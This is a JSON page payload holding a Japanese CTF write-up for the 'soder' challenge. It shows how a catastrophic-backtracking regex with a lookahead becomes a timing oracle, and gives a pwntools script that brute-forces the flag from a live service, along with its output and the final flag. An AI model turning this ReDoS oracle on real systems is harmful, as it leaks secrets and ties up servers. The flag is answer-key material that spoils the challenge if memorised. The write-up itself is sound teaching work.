{"pageProps":{"postData":{"id":"soder","contentHtml":"# soder\n\n## 問題文\n\nflag の validator を作ってもらったのですが、同じ応答しか返しません(´;ω;｀)\\\n`※フラグの形式はTsukuCTF22{[0-9a-z_]+}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。`\\\n`nc 133.130.103.51 31417`\n\n## 難易度\n\n**medium**\n\n## 作問にあたって\n\nWeb の leaks4b の作問中に非想定解のオラクルとして思いついたものを問題にしました(実は作問時に調べたら、先に思いついていた方がいてしょんぼりしていました)。\\\nReDoS 問題としては、脆弱なパターンに任意の入力を渡す場合が多いですが、逆を作ってみました(ReDoS checker で一発なため)。\\\n爆発するバックトラックを発生させるパターンをうまく作成すれば良いです。\n\n## 解法\n\nソースと接続先が与えられる。\\\nソースを見ると以下のようであった。\n\n```python\n#!/usr/bin/env python3\nimport os\nimport re\nfrom timeout_decorator import timeout\n\nFLAG = os.getenv(\"FLAG\", \"TsukuCTF22{dummy_flag}\")\n\n@timeout(5)\ndef flag_validator(pattern):\n    re.match(pattern, FLAG)\n\ndef yakitori():\n    pattern = input(\"Pattern: \")\n    print(\"I check your pattern.\")\n    try:\n        # This function will be timed out in 5 seconds.\n        flag_validator(pattern)\n    except:\n        pass\n    print(\"Probably valid flag!\")\n\nyakitori()\n```\n\nパターンをユーザから受け取り、`re.match`をフラグに行い終了している。\\\n`re.match`の結果を利用していないので、別の手法でフラグを読み取る必要がある。\\\nここで、正規表現のパターンを入力から受け取っているため ReDoS が行えることがわかる。\\\nよく知られている脆弱なパターン`^(([a-zA-Z0-9])+)+$`をフラグ形式に合う形で加工した`^((([0-9a-z_CTF{])+)+)+$`を投げてみる。\n\n```bash\n$ time echo 'Test' | nc 133.130.103.51 31417\nPattern: I check your pattern.\nProbably valid flag!\n\nreal    0m0.687s\nuser    0m0.006s\nsys     0m0.001s\n$ time echo '^((([0-9a-z_CTF{])+)+)+$' | nc 133.130.103.51 31417\nPattern: I check your pattern.\nProbably valid flag!\n\nreal    0m5.562s\nuser    0m0.005s\nsys     0m0.002s\n```\n\n応答時間に差があることがわかる。\\\nつまりこの応答時間からフラグの一致を読み取れる。\\\n`^(?=フラグ文字列)((([0-9a-z_CTF{])+)+)+$`のように肯定先読みを使って、一致した場合にのみ応答が遅れるペイロードを構成してやればよい。\\\n以下の wftf.py を用いる。\n\n```python\nfrom pwn import *\n\nFLAG = \"TsukuCTF22{\"\n\nwhile True:\n    for c in \"0123456789abcdefghijklmnopqrstuvwxyz_\":\n        io = remote(\"133.130.103.51\", \"31417\", level=\"error\")\n        io.recvuntil(b\"Pattern: \")\n        #print(c) # Debug\n        io.sendline(f\"^(?={FLAG}{c})((([0-9a-z_CTF{{])+)+)+$\".encode())\n        response = io.recvrepeat(4.5).decode()\n        if not \"Probably valid flag!\" in response:\n            FLAG += c\n            print(FLAG)\n            io.close()\n            break\n        io.close()\n    else:\n        FLAG += \"}\"\n        print(FLAG)\n        break\n```\n\n実行する\n\n```bash\n$ python wftf.py\nTsukuCTF22{4\nTsukuCTF22{4_\nTsukuCTF22{4_w\nTsukuCTF22{4_w4\nTsukuCTF22{4_w47\nTsukuCTF22{4_w47c\nTsukuCTF22{4_w47ch\nTsukuCTF22{4_w47ch3\nTsukuCTF22{4_w47ch3d\nTsukuCTF22{4_w47ch3d_\nTsukuCTF22{4_w47ch3d_p\nTsukuCTF22{4_w47ch3d_p0\nTsukuCTF22{4_w47ch3d_p07\nTsukuCTF22{4_w47ch3d_p07_\nTsukuCTF22{4_w47ch3d_p07_n\nTsukuCTF22{4_w47ch3d_p07_n3\nTsukuCTF22{4_w47ch3d_p07_n3v\nTsukuCTF22{4_w47ch3d_p07_n3v3\nTsukuCTF22{4_w47ch3d_p07_n3v3r\nTsukuCTF22{4_w47ch3d_p07_n3v3r_\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b0\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b01\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b01l\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5\nTsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5}\n```\n\nflag が得られた。\n\n## TsukuCTF22{4\\_w47ch3d\\_p07\\_n3v3r\\_b01l5}\n","title":"soder","description":"ReDoSの逆問題","author":"Satoki","genre":"Misc","solver":16,"point":498}},"__N_SSG":true}